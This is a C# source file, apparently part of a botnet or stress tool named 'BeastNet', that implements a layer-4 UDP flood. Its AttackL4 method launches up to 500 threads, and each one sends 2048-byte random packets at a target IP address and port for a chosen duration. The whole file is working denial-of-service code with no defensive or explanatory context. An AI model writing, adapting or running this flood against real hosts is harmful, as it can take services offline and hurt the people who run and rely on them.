using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace BeastNet
{
    class Layer4
    {
        public static string RandomString(int size)
        {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            char ch;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            return builder.ToString();
        }

        static void UDP(string target, int port, int time, int tick)
        {
            new IPEndPoint(IPAddress.Parse(target), port);
            UdpClient udpClient = new UdpClient();
            string text;
            byte[] bytes;
            udpClient.Connect(target, port);
            Stopwatch st = new Stopwatch();
            st.Start();
            while (st.Elapsed < TimeSpan.FromSeconds(time))
            {
                try
                {
                    text = RandomString(2048);
                    bytes = Encoding.ASCII.GetBytes(text);
                    udpClient.Send(bytes, bytes.Length);
                    udpClient.DontFragment = true;
                    Thread.Sleep(tick);
                }
                catch
                {
                    continue;
                }
            }
            udpClient.Close();
            st.Stop();
        }

        public static void AttackL4(string target, int port, int thread, int time, int tick, int type)
        {
            switch (type)
            {
                case 0:
                    if (thread > 500)
                    {
                        thread = 500;
                    }

                    for (int i = 0; i < thread; i++)
                    {
                        Thread atk = new Thread(() => UDP(target, port, time, tick));
                        atk.Start();
                    }
                    break;
            }
        }
    }
}
